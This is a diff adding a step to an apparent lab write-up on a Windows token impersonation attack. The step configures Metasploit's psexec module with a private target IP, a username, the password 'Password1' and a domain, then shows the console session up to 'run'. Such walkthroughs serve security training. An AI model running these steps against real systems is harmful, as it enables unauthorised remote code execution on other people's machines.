@@ -261,7 +261,50 @@ View the full module info with the info, or info -d command.
   <img src="/writeups/token impersonation attack/images/step1 1.4.png" width="600">
 </p>
 
+### Step 1 1.5: Setting Required Options
 
+Before running the exploit, need to configure the target and login details.
+
+```bash
+set RHOSTS 192.168.5.142
+set SMBUSER rahimkhan
+set SMBPASS Password1
+set SMBDomain readteambd.local
+```
+
+**What these mean:**
+
+* **RHOSTS** → Target machine IP address
+* **SMBUSER** → Username used to log in
+* **SMBPASS** → Password or NTLM hash for authentication
+* **SMBDomain** → Domain name of the target environment
+
+**Purpose:**
+
+These values tell Metasploit:
+
+* which machine to attack
+* which credentials to use
+* how to authenticate to the target system
+
+
+
+
+
+
+
+msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
+RHOSTS => 192.168.5.142
+msf exploit(windows/smb/psexec) > set Interrupt: use the 'exit' command to quit
+msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
+RHOSTS => 192.168.5.142
+msf exploit(windows/smb/psexec) > set SMBUser rahimkhan
+SMBUser => rahimkhan
+msf exploit(windows/smb/psexec) > set SMBPass Password1
+SMBPass => Password1
+msf exploit(windows/smb/psexec) > set SMBDomain readteambd.local
+SMBDomain => readteambd.local
+msf exploit(windows/smb/psexec) > run
 
 
 
